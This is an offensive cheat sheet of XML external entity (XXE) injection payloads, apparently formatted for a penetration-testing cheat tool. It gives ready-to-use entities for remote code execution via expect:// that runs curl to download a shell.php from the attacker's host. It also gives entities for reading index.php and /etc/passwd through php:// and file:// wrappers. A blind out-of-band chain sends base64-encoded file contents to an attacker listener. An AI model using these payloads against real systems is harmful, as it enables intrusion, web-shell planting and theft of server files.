# Xxe_injection

## xxe injection RCE

### XXE RCE

Spawn XXE RCE with Xxe_injection.

```sh title:"Xxe Injection Spawn XXE RCE"
# Inject this into your request and call &company in the right field to execute the payload, remember to set your listener so the target can download your payload.
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'$IP/shell.php'">
]>
```
<!-- cheat
import tun_ip
-->

## xxe injection File reading

### XXE base64 file read

Read XXE base64 file read with Xxe_injection.

```sh title:"Xxe Injection Read XXE Base64 File Read"
# Inject this into your request inside the XML field to read 'index.php' and call &company in the right field to execute the payload, decode the result using 'echo $data | base64 -d > file && cat file'
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
<!-- cheat
import tun_ip
import webserver
var data
-->

### XXE plaintext file read

Read XXE plaintext file read with Xxe_injection.

```sh title:"Xxe Injection Read XXE Plaintext File Read"
# Inject this into your request inside the XML field to read '/etc/passwd' and call &company in the right field to execute the payload.
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

### XXE blind OOB

Out-of-band XXE chain: parser fetches `evil.dtd` from your server, embeds the target file contents into a URL, and requests it back. Use when the response body doesn't echo entities.

Read XXE blind OOB with Xxe_injection.

```sh title:"Xxe Injection Read XXE Blind OOB"
Step 1: Set up a file like this called evil.dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://$lhost:$lport/?content=%file;'>">
Step 2: Start listener:
php -S 0.0.0.0:8000
Step 3: Inject this into your payload
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://$lhost:$lport/xxe.dtd">
  %remote;
  %oob;
]>
```
<!-- cheat
import tun_ip
import webserver
var port
var lport
-->

